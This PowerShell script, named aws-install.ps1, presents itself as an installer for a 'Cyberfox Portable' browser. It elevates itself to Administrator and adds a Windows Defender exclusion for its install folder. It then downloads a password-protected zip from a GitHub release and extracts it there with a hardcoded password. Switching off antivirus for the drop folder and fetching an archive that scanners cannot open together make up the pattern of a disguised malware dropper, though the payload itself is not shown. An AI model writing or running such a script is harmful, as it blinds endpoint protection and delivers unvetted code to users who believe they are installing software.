# aws-install.ps1

# --- Auto-elevate script if not running as Administrator ---
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole] "Administrator")) {
    Write-Host "Elevating script to run as Administrator..."
    Start-Process -FilePath "powershell" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# --- Variables ---
$desktopPath = [Environment]::GetFolderPath("Desktop")
$awsFolder = Join-Path $desktopPath "AWS"
$cyberfoxPortableFolder = Join-Path $awsFolder "Cyberfox Portable"
$url = "https://github.com/sahmsec/Cyberfox/releases/download/v1.0/CyberfoxPortable.zip"
$zipFile = Join-Path $cyberfoxPortableFolder "CyberfoxPortable.zip"
$password = "aws"

# --- Function to locate WinRAR ---
function Get-WinRARPath {
    $pathsToCheck = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe",
        "HKLM:\SOFTWARE\WinRAR"
    )
    foreach ($path in $pathsToCheck) {
        try {
            if ($path -like "*App Paths*") {
                $regValue = (Get-ItemProperty -Path $path -ErrorAction SilentlyContinue).'(default)'
                if ($regValue -and (Test-Path $regValue)) {
                    return $regValue
                }
            } elseif ($path -eq "HKLM:\SOFTWARE\WinRAR") {
                $installPath = (Get-ItemProperty -Path $path -Name "Path" -ErrorAction SilentlyContinue).Path
                if ($installPath) {
                    $winrarExe = Join-Path $installPath "WinRAR.exe"
                    if (Test-Path $winrarExe) {
                        return $winrarExe
                    }
                }
            }
        } catch {}
    }

    $defaultPaths = @(
        "$env:ProgramFiles\WinRAR\WinRAR.exe",
        "$env:ProgramFiles(x86)\WinRAR\WinRAR.exe"
    )
    foreach ($p in $defaultPaths) {
        if (Test-Path $p) { return $p }
    }
    return $null
}

# --- Main script starts ---

$winrarPath = Get-WinRARPath
if (-not $winrarPath) {
    Write-Host "WinRAR not found. Please install it from https://www.win-rar.com/ and rerun this script." -ForegroundColor Red
    Pause
    exit 1
}
Write-Host "Found WinRAR at: $winrarPath"

# Create AWS folder if needed
if (-Not (Test-Path $awsFolder)) {
    New-Item -ItemType Directory -Path $awsFolder | Out-Null
    Write-Host "Created AWS folder: $awsFolder"
} else {
    Write-Host "AWS folder found: $awsFolder"
}

# Create Cyberfox Portable folder if needed
if (-Not (Test-Path $cyberfoxPortableFolder)) {
    New-Item -ItemType Directory -Path $cyberfoxPortableFolder | Out-Null
    Write-Host "Created Cyberfox Portable folder: $cyberfoxPortableFolder"
} else {
    Write-Host "Cyberfox Portable folder found: $cyberfoxPortableFolder"
}

# Add Defender exclusion
try {
    $existingExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
    if ($existingExclusions -notcontains $cyberfoxPortableFolder) {
        Write-Host "Adding Defender exclusion for: $cyberfoxPortableFolder"
        Add-MpPreference -ExclusionPath $cyberfoxPortableFolder
    } else {
        Write-Host "Defender exclusion already exists for: $cyberfoxPortableFolder"
    }
} catch {
    Write-Warning "Failed to add Defender exclusion. Please ensure you run as Administrator."
}

# Download zip file
Write-Host "Downloading zip..."
try {
    Invoke-WebRequest -Uri $url -OutFile $zipFile -UseBasicParsing
    Write-Host "Download complete."
} catch {
    Write-Host "Download failed: $_" -ForegroundColor Red
    Pause
    exit 1
}

# Extract zip using WinRAR
Write-Host "Extracting zip with password..."
$extractArgs = @(
    "x",
    "-p$password",
    "-y",
    "`"$zipFile`"",
    "`"$cyberfoxPortableFolder`""
)
$proc = Start-Process -FilePath $winrarPath -ArgumentList $extractArgs -Wait -PassThru

if ($proc.ExitCode -eq 0) {
    Write-Host "Extraction successful."
} elseif ($proc.ExitCode -eq 1) {
    Write-Host "Extraction completed with warnings."
} else {
    Write-Host "Extraction failed with exit code $($proc.ExitCode)." -ForegroundColor Red
    Pause
    exit 1
}

# Delete the zip file
Remove-Item $zipFile
Write-Host "Deleted zip file."

Write-Host "All done! Files extracted to $cyberfoxPortableFolder"

# Open the extracted folder in Explorer
Start-Process explorer.exe $cyberfoxPortableFolder

# Pause so user can see messages before exit
Write-Host "Press any key to exit..."
$x = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

# Close PowerShell window if running in ConsoleHost
if ($host.Name -eq 'ConsoleHost') {
    exit
}
